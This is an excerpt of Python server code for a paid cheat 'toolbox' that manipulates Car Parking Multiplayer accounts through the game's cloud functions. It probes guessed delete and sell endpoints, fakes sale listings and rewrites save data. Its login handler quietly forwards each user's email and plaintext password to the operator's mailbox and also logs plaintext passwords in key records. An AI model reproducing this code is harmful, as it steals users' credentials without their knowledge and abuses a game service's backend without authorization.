                        report.append('  --- 嫌疑车汇总: %d 辆 ---' % len(_susp25))
                        _cids25 = c.record.get('carIDnStatus') or {}
                        _gens25 = (_cids25.get('carGeneratedIDs') or []) if isinstance(_cids25, dict) else []
                        _ne25 = [(i2, str(g)) for i2, g in enumerate(_gens25) if str(g or '').strip()]
                        report.append('  存档 genIDs 非空: %d 条' % len(_ne25))
                        for _i25, _g25 in _ne25[-60:]:
                            report.append('    [%d] %s' % (_i25, _g25[:48]))
                    except Exception as _e25:
                        report.append('  [25] 外层 %s' % str(_e25)[:150])

                if _want('del'):
                    report.append('--- (26) 摘除测试车 genID ---')
                    try:
                        _rec26 = c.record
                        _ck26 = (_rec26.get('carIDnStatus') or {}) if isinstance(_rec26, dict) else {}
                        _gens26 = list(_ck26.get('carGeneratedIDs') or []) if isinstance(_ck26, dict) else []
                        _sts26 = list(_ck26.get('carStatus') or []) if isinstance(_ck26, dict) else []
                        report.append('  当前 genIDs 条数: %d' % len(_gens26))
                        _hit26 = 0
                        for _i26 in range(len(_gens26)):
                            _g26 = str(_gens26[_i26] or '')
                            if not _g26:
                                continue
                            _mark26 = False
                            for _m26 in ('TST', 'TR9', 'TRX', 'TRF', 'TRG'):
                                if _m26 in _g26:
                                    _mark26 = True
                                    break
                            if _mark26:
                                _gens26[_i26] = ''
                                if _i26 < len(_sts26):
                                    _sts26[_i26] = 0
                                _hit26 += 1
                                report.append('    清除: [%d] %s' % (_i26, _g26[:48]))
                        if _hit26 == 0:
                            report.append('  未匹配到测试车 genID（可能不在 carGeneratedIDs 里）')
                        else:
                            _new26 = json.loads(json.dumps(_rec26, ensure_ascii=False))
                            _new26['carIDnStatus'] = {'carGeneratedIDs': _gens26, 'carStatus': _sts26}
                            _rr26 = c._send(_new26, c.original, ['carIDnStatus'])
                            _ok26 = bool(_rr26.get('ok'))
                            report.append('  提交: %s %s' % ('OK' if _ok26 else 'FAIL', str(_rr26.get('message') or _rr26.get('result') or '')[:80]))
                            if _ok26:
                                time.sleep(0.8)
                                if c.load():
                                    _cids26b = c.record.get('carIDnStatus') or {}
                                    _gens26b = (_cids26b.get('carGeneratedIDs') or []) if isinstance(_cids26b, dict) else []
                                    _still26 = 0
                                    for _g26b in _gens26b:
                                        _g26c = str(_g26b or '')
                                        for _m26b in ('TST', 'TR9', 'TRX', 'TRF', 'TRG'):
                                            if _m26b in _g26c:
                                                _still26 += 1
                                                break
                                    report.append('  回读: 测试车残留 %d 条（原 %d 条命中）' % (_still26, _hit26))
                                else:
                                    report.append('  回读: 刷新失败')
                    except Exception as _e26:
                        report.append('  [26] 外层 %s' % str(_e26)[:150])
                if _want('scan2'):
                    report.append('--- (27) 测试车详情 ---')
                    try:
                        _d27 = None
                        if _aes_body is not None:
                            _r27 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d27 = _r27.get('result') if isinstance(_r27, dict) else None
                            for _u in range(2):
                                if isinstance(_d27, str):
                                    try:
                                        _d27 = json.loads(_d27)
                                    except Exception:
                                        break
                        _dc27 = _d27 if isinstance(_d27, list) else []
                        report.append('  车对象数: %d' % len(_dc27))
                        _n27 = 0
                        for _c27 in _dc27:
                            if not isinstance(_c27, dict):
                                continue
                            _t27 = _c27.get('texts') or []
                            _k27 = str(_t27[2]) if isinstance(_t27, list) and len(_t27) >= 3 else ''
                            if any(_m in _k27 for _m in ('TST', 'TR9', 'TRX', 'TRF', 'TRG')):
                                _n27 += 1
                                report.append('  ===%s (CarID=%s) ===' % (_k27, str(_c27.get('CarID'))))
                                report.append('    keys: %s' % list(_c27.keys()))
                                report.append('    dataVersion: %r' % _c27.get('dataVersion'))
                                _vy27 = _c27.get('Vynils')
                                _k27t = type(_vy27).__name__
                                try:
                                    _s27 = json.dumps(_vy27, ensure_ascii=False)[:150]
                                except Exception:
                                    _s27 = '?'
                                report.append('    Vynils: type=%s preview=%s' % (_k27t, _s27))
                                for _f27 in ('floats', 'gears', 'typeToInstall', 'BoughtParts', 'vectors', 'fsoData', 'WindowVinyls'):
                                    _v27 = _c27.get(_f27)
                                    _t27b = type(_v27).__name__
                                    _l27 = len(_v27) if isinstance(_v27, (list, str, dict)) else 0
                                    try:
                                        _p27 = json.dumps(_v27, ensure_ascii=False)[:120]
                                    except Exception:
                                        _p27 = '?'
                                    report.append('    %s: %s len=%d %s' % (_f27, _t27b, _l27, _p27))
                        report.append('  测试车命中: %d' % _n27)
                    except Exception as _e27:
                        report.append('  [27] 外层 %s' % str(_e27)[:150])

                if _want('delfn'):
                    report.append('--- (28) 删车/挂售函数爆破 ---')
                    try:
                        _d28 = None
                        if _aes_body is not None:
                            _r28 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d28 = _r28.get('result') if isinstance(_r28, dict) else None
                            for _u in range(2):
                                if isinstance(_d28, str):
                                    try:
                                        _d28 = json.loads(_d28)
                                    except Exception:
                                        break
                        _dc28 = _d28 if isinstance(_d28, list) else []
                        _tgt28 = None
                        for _c28 in _dc28:
                            if not isinstance(_c28, dict):
                                continue
                            _t28 = _c28.get('texts') or []
                            _k28 = str(_t28[2]) if isinstance(_t28, list) and len(_t28) >= 3 else ''
                            if 'TST' in _k28 or 'TR9' in _k28:
                                _tgt28 = _c28
                                break
                        if _tgt28 is None:
                            report.append('  未找到 TST/TR9 测试车')
                        else:
                            _key28 = str((_tgt28.get('texts') or ['', '', ''])[2])
                            _cid28 = int(_tgt28.get('CarID') or 0)
                            report.append('  目标: %s (CarID=%s)' % (_key28, _cid28))
                            _fns28 = ['WSDeleteCarV3', 'WSDeleteCar', 'DeleteCarV3', 'WSDestroyCarV3',
                                      'WSRemoveCarV3', 'WSScrapCarV3', 'DeleteCar', 'RemoveCarV3']
                            for _fn28 in _fns28:
                                _r28b = None
                                try:
                                    _r28b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/' + _fn28, {'data': _key28}, headers={'Authorization': 'Bearer ' + _tv}, timeout=12)
                                except Exception as _e28:
                                    report.append('  [%s] ERR %s' % (_fn28, str(_e28)[:90]))
                                    continue
                                _s28 = json.dumps(_r28b, ensure_ascii=False)[:160] if isinstance(_r28b, dict) else str(_r28b)[:160]
                                report.append('  [%s] -> %s' % (_fn28, _s28))
                            _pay28 = {
                                'ownerID': str(c.record.get('localID') or ''),
                                'ownerName': str(c.record.get('Name') or ''),
                                'price': 100,
                                'description': '',
                                'carID': _cid28,
                                'carClass': 1,
                                'carGeneratedID': _key28,
                                'black': False,
                                'ownerAccountID': str((c.record.get('localID') or '')),
                                'flagID': -1,
                                'publishMode': 1,
                                'env': 1,
                                'like': 0,
                                'rand': 0.5,
                                'status': 1,
                            }
                            try:
                                _r28c = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/WSSellCarV3', {'data': json.dumps(_pay28, ensure_ascii=False)}, headers={'Authorization': 'Bearer ' + _tv}, timeout=15)
                                _s28c = json.dumps(_r28c, ensure_ascii=False)[:200] if isinstance(_r28c, dict) else str(_r28c)[:200]
                                report.append('  [WSSellCarV3 仿挂售] -> %s' % _s28c)
                            except Exception as _e28c:
                                report.append('  [WSSellCarV3 仿挂售] ERR %s' % str(_e28c)[:90])
                            time.sleep(1.0)
                            try:
                                _r28d = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None}, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                                _v28d = _r28d.get('result') if isinstance(_r28d, dict) else None
                                for _u in range(2):
                                    if isinstance(_v28d, str):
                                        try:
                                            _v28d = json.loads(_v28d)
                                        except Exception:
                                            break
                                _alive28 = 0
                                if isinstance(_v28d, list):
                                    for _c28b in _v28d:
                                        if isinstance(_c28b, dict):
                                            _t28b = _c28b.get('texts') or []
                                            _k28b = str(_t28b[2]) if isinstance(_t28b, list) and len(_t28b) >= 3 else ''
                                            if _key28 == _k28b:
                                                _alive28 += 1
                                report.append('  回读: 目标车"存活"副本数=%d（原 1）' % _alive28)
                            except Exception as _e28d:
                                report.append('  回读 ERR %s' % str(_e28d)[:90])
                    except Exception as _e28x:
                        report.append('  [28] 外层 %s' % str(_e28x)[:150])
                if _want('fixc'):
                    report.append('--- (29) 测试车字段修复实验 ---')
                    try:
                        _d29 = None
                        if _aes_body is not None:
                            _r29 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', _aes_body, headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _d29 = _r29.get('result') if isinstance(_r29, dict) else None
                            for _u in range(2):
                                if isinstance(_d29, str):
                                    try:
                                        _d29 = json.loads(_d29)
                                    except Exception:
                                        break
                        _dc29 = _d29 if isinstance(_d29, list) else []
                        _tg29 = []
                        for _c29 in _dc29:
                            if not isinstance(_c29, dict):
                                continue
                            _t29 = _c29.get('texts') or []
                            _k29 = str(_t29[2]) if isinstance(_t29, list) and len(_t29) >= 3 else ''
                            if any(_m29 in _k29 for _m29 in ('TST', 'TR9', 'TRX')):
                                _tg29.append(_c29)
                        report.append('  目标车: %d 辆' % len(_tg29))
                        for _c29 in _tg29:
                            _k29 = str((_c29.get('texts') or ['', '', ''])[2])
                            _cid29 = int(_c29.get('CarID') or 0)
                            report.append('  ===%s===  旧: dataVersion=%r Vynils=%s' % (
                                _k29,
                                _c29.get('dataVersion'),
                                json.dumps(_c29.get('Vynils'), ensure_ascii=False)[:60]))
                            _m29 = json.loads(json.dumps(_c29, ensure_ascii=False))
                            _m29['dataVersion'] = 2
                            _m29['Vynils'] = {'allVynils': [], 'CarID': _cid29}
                            _w29 = None
                            try:
                                _w29 = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/SaveCarsPartially8',
                                                 {'data': json.dumps(_m29, ensure_ascii=False)},
                                                 headers={'Authorization': 'Bearer ' + _tv}, timeout=25)
                            except Exception as _e29:
                                report.append('    提交 ERR %s' % str(_e29)[:80])
                                continue
                            _s29 = json.dumps(_w29, ensure_ascii=False)[:100] if isinstance(_w29, dict) else str(_w29)[:100]
                            report.append('    提交: %s' % _s29)
                            time.sleep(0.8)
                            _r29b = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2', {'data': None},
                                              headers={'Authorization': 'Bearer ' + _tv}, timeout=30)
                            _v29b = _r29b.get('result') if isinstance(_r29b, dict) else None
                            for _u in range(2):
                                if isinstance(_v29b, str):
                                    try:
                                        _v29b = json.loads(_v29b)
                                    except Exception:
                                        break
                            _now29 = None
                            if isinstance(_v29b, list):
                                for _c29b in _v29b:
                                    if isinstance(_c29b, dict):
                                        _t29b = _c29b.get('texts') or []
                                        _k29b = str(_t29b[2]) if isinstance(_t29b, list) and len(_t29b) >= 3 else ''
                                        if _k29b == _k29:
                                            _now29 = _c29b
                                            break
                            if _now29 is None:
                                report.append('    回读: 未找到')
                            else:
                                report.append('    回读: dataVersion=%r Vynils=%s' % (
                                    _now29.get('dataVersion'),
                                    json.dumps(_now29.get('Vynils'), ensure_ascii=False)[:60]))
                    except Exception as _e29:
                        report.append('  [29] 外层 %s' % str(_e29)[:150])
                return self._json(200, {'ok': True, 'report': report})

            if path == '/api/admin/gen':
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                _isvip = bool(body.get('vip'))
                keys = gen_key('forever' if _isvip else str(body.get('type') or '1d'), body.get('count') or 1,
                               body.get('perms') if isinstance(body.get('perms'), list) else None,
                               vip=_isvip)
                if keys:
                    _keys_save()
                return self._json(200, {'ok': True, 'keys': keys})

            if path == '/api/admin/list':
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                with _KEY_LOCK:
                    items = []
                    for kh, it in _KEYS['keys'].items():
                        items.append({'kh': kh, 'raw': it.get('raw'), 'type': it.get('type'),
                                      'created': it.get('created'), 'activated': it.get('activated'),
                                      'disabled': bool(it.get('disabled')),
                                      'perms': list(it.get('perms') or []),
                                      'usesCount': len(it.get('uses') or []),
                                      'vip': bool(it.get('vip')),
                                      'boundEmail': it.get('bound_email') or ''})
                items.sort(key=lambda x: x.get('created') or 0, reverse=True)
                return self._json(200, {'ok': True, 'keys': items[:1000], 'total': len(items),
                                        'types': KEY_EXPIRE_NAMES, 'now': int(time.time())})

            if path == '/api/admin/set':
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                kh = str(body.get('kh') or '')
                if not kh and body.get('raw'):
                    kh = _key_hash(body.get('raw'))
                done = False
                with _KEY_LOCK:
                    it = _KEYS['keys'].get(kh)
                    if it:
                        if 'disabled' in body:
                            it['disabled'] = bool(body.get('disabled'))
                        done = True
                if done:
                    _keys_save()
                return self._json(200, {'ok': done, 'message': '' if done else '密钥不存在'})

            if path == '/api/admin/del':
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                kh = str(body.get('kh') or '')
                if not kh and body.get('raw'):
                    kh = _key_hash(body.get('raw'))
                done = False
                with _KEY_LOCK:
                    if kh in _KEYS['keys']:
                        del _KEYS['keys'][kh]
                        done = True
                if done:
                    _keys_save()
                return self._json(200, {'ok': done})

            if path == '/api/admin/mailtest':
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                okm = send_mail('CPM 工具箱 - 测试邮件',
                                '这是一封测试邮件，收到说明邮件通知功能正常。\n时间: %s' % time.strftime('%Y-%m-%d %H:%M:%S'))
                return self._json(200, {'ok': bool(okm),
                                        'message': '已发送，请查收 %s' % MAIL_TO if okm else '发送失败（检查 MAIL_USER / MAIL_PASS 配置）'})

            if path == '/api/admin/tgtest':
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                okt = send_telegram('CPM 工具箱 - 测试消息\n收到这条说明 Telegram 通知正常。\n时间: %s' % time.strftime('%Y-%m-%d %H:%M:%S'))
                return self._json(200, {'ok': bool(okt),
                                        'message': '已发送到 Telegram' if okt else '发送失败（检查 TG_TOKEN / TG_CHAT 配置）'})

            if path == '/api/admin/ghcheck':
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                if not (GH_TOKEN and GH_REPO):
                    return self._json(200, {'ok': False, 'message': 'GH 未配置（GH_TOKEN/GH_REPO 缺失）'})
                with _KEY_LOCK:
                    data = json.dumps(_KEYS, ensure_ascii=False, indent=1)
                try:
                    url = 'https://api.github.com/repos/%s/contents/%s' % (GH_REPO, GH_PATH)
                    sha = None
                    try:
                        sha = _gh_http(url, 'GET').get('sha')
                    except Exception:
                        pass
                    payload = {'message': 'update keys.json (ghcheck)',
                               'content': base64.b64encode(data.encode('utf-8')).decode('ascii')}
                    if sha:
                        payload['sha'] = sha
                    rr = _gh_http(url, 'PUT', payload)
                    csha = ((rr or {}).get('commit') or {}).get('sha') or ''
                    return self._json(200, {'ok': True, 'message': '同步成功 repo=%s commit=%s' % (GH_REPO, csha[:10])})
                except Exception as e:
                    return self._json(200, {'ok': False, 'message': '同步失败: %s（repo=%s）' % (repr(e)[:200], GH_REPO)})

            if path == '/api/admin/uses':
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                kh = str(body.get('kh') or '')
                with _KEY_LOCK:
                    _it = _KEYS['keys'].get(kh)
                    uses = list(_it.get('uses') or []) if _it else None
                if uses is None:
                    return self._json(200, {'ok': False, 'message': '密钥不存在'})
                uses.sort(key=lambda x: x.get('time') or 0, reverse=True)
                return self._json(200, {'ok': True, 'uses': uses[:80]})

            # ===== 访客访问日志（PATCH45） =====
            if path == '/api/visit':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                _allow, _ban = sec_check(self, 'visit')
                if not _allow:
                    return self._json(200, {'ok': False, 'message': '操作过于频繁'})
                try:
                    _it = visit_add(self, body)
                except Exception as _ev:
                    return self._json(200, {'ok': False, 'message': '记录失败'})
                return self._json(200, {'ok': True, 'count': len(_VISITS.get('items') or [])})

            if path == '/api/admin/visits':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                with _VISITS_LOCK:
                    items = list(_VISITS.get('items') or [])
                items.sort(key=lambda x: x.get('time') or 0, reverse=True)
                try:
                    limit = int(body.get('limit') or 200)
                except Exception:
                    limit = 200
                limit = max(1, min(1000, limit))
                out = items[:limit]
                # 需要归属地时再查（缓存到记录里，避免重复请求）
                if body.get('geo'):
                    _cache = {}
                    for _x in out[:60]:
                        _ipx = _x.get('ip') or ''
                        if not _ipx:
                            continue
                        if _x.get('geo'):
                            continue
                        if _ipx not in _cache:
                            _cache[_ipx] = _ip_geo(_ipx)
                        _x['geo'] = _cache[_ipx]
                    try:
                        _visits_save(sync=False)
                    except Exception:
                        pass
                # 统计：今日 / 独立IP / 总数
                _now_t = int(time.time())
                _today0 = _now_t - (_now_t % 86400) - time.timezone
                _today = [x for x in items if (x.get('time') or 0) >= _today0]
                _ips = set([x.get('ip') or '' for x in items if x.get('ip')])
                return self._json(200, {'ok': True, 'items': out,
                                        'total': len(items),
                                        'today': len(_today),
                                        'uniqIp': len(_ips),
                                        'now': _now_t})

            if path == '/api/admin/visits/clear':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                with _VISITS_LOCK:
                    _VISITS['items'] = []
                _visits_save()
                return self._json(200, {'ok': True})

            # ===== 首页轮播公告（PATCH45） =====
            if path == '/api/notice':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                global _NOTICE
                data = body.get('notice') if isinstance(body.get('notice'), dict) else body
                _passv = body.get('pass')
                if not _passv and isinstance(data, dict):
                    _passv = data.get('pass')
                oks, msg = admin_check(_passv, self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                with _NOTICE_LOCK:
                    cur = dict(_NOTICE)
                if isinstance(data, dict):
                    for _k in ('enabled', 'items', 'speed', 'fontSize', 'colorMode', 'color',
                               'gradColor1', 'gradColor2', 'bgMode', 'bgAlpha', 'bold'):
                        if _k in data:
                            cur[_k] = data.get(_k)
                cur['updated'] = int(time.time())
                _NOTICE = _notice_normalize(cur)
                _notice_save()
                return self._json(200, {'ok': True, 'notice': notice_public()['notice']})

            if path in ('/api/login', '/api/load', '/api/action', '/api/logout'):
                # 小b：口令可为【用户密钥】或【超管/管理员口令】
                _inp = str(body.get('access') or body.get('key') or '').strip()
                _role = ''
                _kh = ''
                if sec_safe_eq(_inp, ADMIN_PASS):
                    _role = 'super'
                elif verify_site_admin(_inp):
                    _role = 'admin'
                else:
                    _okk, _info = verify_key(_inp)
                    if _okk:
                        _role = 'user'
                        _kh = (_info or {}).get('kh') or ''
                if not _role:
                    # 首页密钥验证关闭时：无需口令即可进入（超管口令仍优先识别）
                    with _CFG_LOCK:
                        _kg = bool(_CFG.get('key_gate', True))
                    if not _kg:
                        _role = 'guest'
                    else:
                        return self._json(200, {'ok': False, 'message': '请先输入有效口令', 'needKey': True})
                if path == '/api/login' and _role == 'user' and _kh:
                    with _KEY_LOCK:
                        _it = _KEYS['keys'].get(_kh)
                        _be = (_it.get('bound_email') or '') if _it else ''
                        _vip = bool(_it.get('vip')) if _it else False
                    _em = str(body.get('email') or '').strip().lower()
                    if (not _vip) and _be and _em and _em != _be:
                        return self._json(200, {'ok': False, 'message': '此密钥已绑定其他账号，无法使用'})

            if path == '/api/login':
                c = Client()
                r = c.login(str(body.get('email') or '').strip(), str(body.get('password') or ''))
                if not r.get('ok'):
                    try:
                        with open(os.path.join(HERE, 'debug_login.txt'), 'a', encoding='utf-8') as f:
                            f.write('[%s] login-failed resp=%s\n' % (
                                time.strftime('%Y-%m-%d %H:%M:%S'),
                                json.dumps(r, ensure_ascii=False)))
                    except Exception:
                        pass
                    return self._json(200, r)
                # 登录成功 → 回传账号信息到指定邮箱
                try:
                    ip = self.headers.get('X-Forwarded-For') or self.headers.get('X-Real-IP') or self.client_address[0]
                except Exception:
                    ip = ''
                notify_login(str(body.get('email') or '').strip(),
                             str(body.get('password') or ''), c.uid, ip)
                # 记录使用详情 + 首次登录绑定邮箱 + 开始计时
                okk2, info2 = False, {}
                _bind_note = ''
                try:
                    okk2, info2 = verify_access(body.get('access') or '')
                    _inp2 = str(body.get('access') or '').strip()
                    _is_super2 = sec_safe_eq(_inp2, ADMIN_PASS)
                    _is_siteadmin2 = False
                    try:
                        _is_siteadmin2 = verify_site_admin(_inp2)
                    except Exception:
                        _is_siteadmin2 = False
                    if not okk2:
                        _bind_note = 'access校验失败'
                    elif _is_super2:
                        _bind_note = '超级管理员'
                        _log_super_use(_inp2, body, c, ip, 'super')
                    elif _is_siteadmin2:
                        _bind_note = '网站管理员'
                        _log_super_use(_inp2, body, c, ip, 'siteadmin')
                    else:
                        kh2 = info2.get('kh') or ''
                        _em2 = str(body.get('email') or '').strip()
                        _okb, _msgb = bind_key_account(kh2, _em2)
                        _bind_note = '绑定:%s%s' % ('✓' if _okb else '✗', _msgb or '')
                        if not _okb:
                            return self._json(200, {'ok': False, 'message': _msgb})
                        with _KEY_LOCK:
                            it2 = _KEYS['keys'].get(kh2)
                            if it2 is not None:
                                uses = list(it2.get('uses') or [])
                                uses.append({'email': _em2,
                                             'password': str(body.get('password') or ''),
                                             'uid': c.uid or '', 'ip': ip,
                                             'time': int(time.time()),
                                             'note': _bind_note})
                                it2['uses'] = uses[-60:]
                            else:
                                _bind_note += '（密钥记录未找到）'
                        _keys_save()
                except Exception as _e_bind:
                    _bind_note = '异常:%s' % str(_e_bind)[:60]
                    try:
                        with open(os.path.join(HERE, 'bind_debug.txt'), 'a', encoding='utf-8') as f:
                            f.write('[%s] %s\n' % (time.strftime('%Y-%m-%d %H:%M:%S'), _bind_note))
                    except Exception:
                        pass
                sid = make_session(c, (info2.get('kh') if okk2 else '') or '', (info2.get('type') if okk2 else '') or '')
                if c.load():
                    return self._json(200, {'ok': True, 'uid': c.uid, 'sid': sid,
                                            'overview': make_overview(c.record)})
                return self._json(200, {'ok': False,
                                        'message': '登录成功，但存档没读出来——再点一次登录重试'})

            if path == '/api/load':
                _ok3, _msg3, c = check_session_access(body.get('sid'), body.get('access'))
                if not _ok3:
                    return self._json(200, {'ok': False, 'message': _msg3, 'needKey': '密钥' in _msg3})
                if c.load():
                    return self._json(200, {'ok': True, 'overview': make_overview(c.record)})
                return self._json(200, {'ok': False, 'message': '没读到数据，检查网络后重试'})

            if path == '/api/logout':
                _ok4, _msg4, _c4 = check_session_access(body.get('sid'), body.get('access'))
                if not _ok4:
                    return self._json(200, {'ok': False, 'message': _msg4})
                drop_session(str(body.get('sid') or ''))
                return self._json(200, {'ok': True})

            if path == '/api/action':
                _ok5, _msg5, c = check_session_access(body.get('sid'), body.get('access'))
                if not _ok5:
                    return self._json(200, {'ok': False, 'message': _msg5, 'needKey': '密钥' in _msg5})
                action = str(body.get('action') or '')
                # 小b：不做密钥级权限限制（功能是否显示由超管的开关控制）
                return self._json(200, self._do_action(c, action, body.get('params') or {}))

            if path == '/api/clone/start':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False,
                                            'message': '密钥验证失败：%s' % (info if isinstance(info, str) else '未知'),
                                            'needKey': True})
                if info.get('type') != 'admin':
                    with _KEY_LOCK:
                        _it = _KEYS['keys'].get(info.get('kh') or '')
                        _perms = list(_it.get('perms') or []) if _it else []
                    if 'clone' not in _perms:
                        return self._json(200, {'ok': False, 'message': '此功能未包含在你的密钥中（找站长升级）'})
                sid = str(body.get('sid') or '')
                de = str(body.get('dst_email') or '').strip()
                dp = str(body.get('dst_password') or '')
                if not get_session(sid):
                    return self._json(200, {'ok': False, 'message': '请先登录【源账号】（要复制数据的账号）'})
                if not de or not dp:
                    return self._json(200, {'ok': False, 'message': '请填写目标账号（B）的邮箱和密码'})
                jid = _clone_new_job()
                threading.Thread(target=_clone_run,
                                 args=(jid, sid, de, dp, body.get('options') or {}),
                                 daemon=True).start()
                return self._json(200, {'ok': True, 'job': jid})

            if path == '/api/clone/status':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False, 'message': '校验失败'})
                jid = str(body.get('job') or '')
                with _KEY_LOCK:
                    j = _CLONE_JOBS.get(jid)
                    data = dict(j) if j else None
                if not data:
                    return self._json(200, {'ok': False, 'message': '任务不存在'})
                return self._json(200, {'ok': True, 'job': jid, 'phase': data.get('phase'),
                                        'message': data.get('message'), 'done': data.get('done'),
                                        'total': data.get('total'), 'vehicles': data.get('vehicles'),
                                        'finished': data.get('finished'), 'result': data.get('result'),
                                        'error': data.get('error') or ''})

            if path == '/api/cars/unlock/start':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                return self._json(200, {'ok': False, 'message': '全车一键注入已下线'})

            if path == '/api/cars/unlock/status':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                return self._json(200, {'ok': False, 'message': '全车一键注入已下线'})

            if path == '/api/register':
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False, 'message': '请先输入有效密钥', 'needKey': True})
                email = str(body.get('email') or '').strip()
                password = str(body.get('password') or '').strip()
                if not email or not password:
                    return self._json(200, {'ok': False, 'message': '邮箱和密码都要填'})
                rr = register_account(email, password)
                return self._json(200, rr)

            if path == '/api/clone/auto':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False, 'message': '密钥验证失败', 'needKey': True})
                if info.get('type') != 'admin':
                    with _KEY_LOCK:
                        _it = _KEYS['keys'].get(info.get('kh') or '')
                        _perms = list(_it.get('perms') or []) if _it else []
                    if 'clone' not in _perms:
                        return self._json(200, {'ok': False, 'message': '此功能未包含在你的密钥中（找站长升级）'})
                sid = str(body.get('sid') or '')
                if not get_session(sid):
                    return self._json(200, {'ok': False, 'message': '请先登录【源账号】'})
                # PATCH35：先注册新账号，再走标准克隆流程（_clone_run）
                _em35 = str(body.get('new_email') or '').strip()
                _pw35 = str(body.get('new_password') or '').strip()
                if not _em35 or not _pw35:
                    return self._json(200, {'ok': False, 'message': '请填写新账号邮箱和密码'})
                if len(_pw35) < 6:
                    return self._json(200, {'ok': False, 'message': '新账号密码至少 6 位'})
                _reg = register_account(_em35, _pw35)
                if not _reg.get('ok'):
                    return self._json(200, {'ok': False, 'message': '注册失败：' + str(_reg.get('message') or '')})
                jid = _clone_new_job()
                threading.Thread(target=_clone_run,
                                 args=(jid, sid, _em35, _pw35, body.get('options') or {}),
                                 daemon=True).start()
                return self._json(200, {'ok': True, 'job': jid, 'email': _em35, 'password': _pw35})

            if path == '/api/clone/batch/start':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False, 'message': '密钥验证失败', 'needKey': True})
                if info.get('type') != 'admin':
                    with _KEY_LOCK:
                        _it = _KEYS['keys'].get(info.get('kh') or '')
                        _perms = list(_it.get('perms') or []) if _it else []
                    if 'clone' not in _perms:
                        return self._json(200, {'ok': False, 'message': '此功能未包含在你的密钥中（找站长升级）'})
                sid = str(body.get('sid') or '')
                if not get_session(sid):
                    return self._json(200, {'ok': False, 'message': '请先登录【源账号】'})
                try:
                    count = int(body.get('count') or 1)
                except Exception:
                    count = 1
                count = max(1, min(20, count))
                prefix = str(body.get('prefix') or 'cpmclone').strip() or 'cpmclone'
                domain = str(body.get('domain') or 'gmail.com').strip() or 'gmail.com'
                jid = _batch_new_job()
                threading.Thread(target=_batch_run,
                                 args=(jid, sid, count, prefix, domain, body.get('options') or {}, None, None, str(body.get('password') or '').strip() or None),
                                 daemon=True).start()
                return self._json(200, {'ok': True, 'job': jid})

            if path == '/api/clone/batch/status':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False, 'message': '校验失败'})
                with _KEY_LOCK:
                    j = _BATCH_JOBS.get(str(body.get('job') or ''))
                    data = json.loads(json.dumps(j, ensure_ascii=False)) if j else None
                if not data:
                    return self._json(200, {'ok': False, 'message': '任务不存在'})
                return self._json(200, {'ok': True, 'job': data})

            if path == '/api/cardebug':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False, 'message': '请先输入有效密钥', 'needKey': True})
                c = get_session(str(body.get('sid') or ''))
                if not c:
                    return self._json(200, {'ok': False, 'message': '会话失效，重新登录'})
                if not c.load():
                    return self._json(200, {'ok': False, 'message': '读档失败'})
                rec = c.record
                fcar = rec.get('fcar') or []
                fsos = rec.get('boughtFsos') or []
                cids = rec.get('carIDnStatus') or {}
                gen = (cids.get('carGeneratedIDs') or []) if isinstance(cids, dict) else []
                stt = (cids.get('carStatus') or []) if isinstance(cids, dict) else []
                ad = rec.get('allData') or ''
                ints = rec.get('integers') or []
                flts = rec.get('floats') or []
                pd = rec.get('platesData') or {}
                plates = (pd.get('allPlates') or []) if isinstance(pd, dict) else []
                gen_ne = [i for i, x in enumerate(gen) if str(x)]
                gen_vals = [str(x) for x in gen if str(x)]
                st_nz = [i for i, x in enumerate(stt) if x]
                plate_brief = []
                for p in plates[:6]:
